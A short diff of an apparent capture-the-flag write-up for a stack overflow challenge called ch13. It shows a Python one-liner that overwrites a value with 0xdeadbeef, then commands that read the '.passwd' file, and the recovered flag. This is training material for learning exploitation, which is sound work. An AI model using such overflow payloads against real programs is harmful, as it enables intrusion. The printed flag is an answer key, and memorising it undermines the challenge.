@@ -7,5 +7,7 @@ We have to give ``deadbeef`` in reverse order since the stack reads them in the 
 ```cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13``` 
 
 Then do ``ls -al``.
+
 And ``cat .passwd``
+
 We get ``1w4ntm0r3pr0np1s``
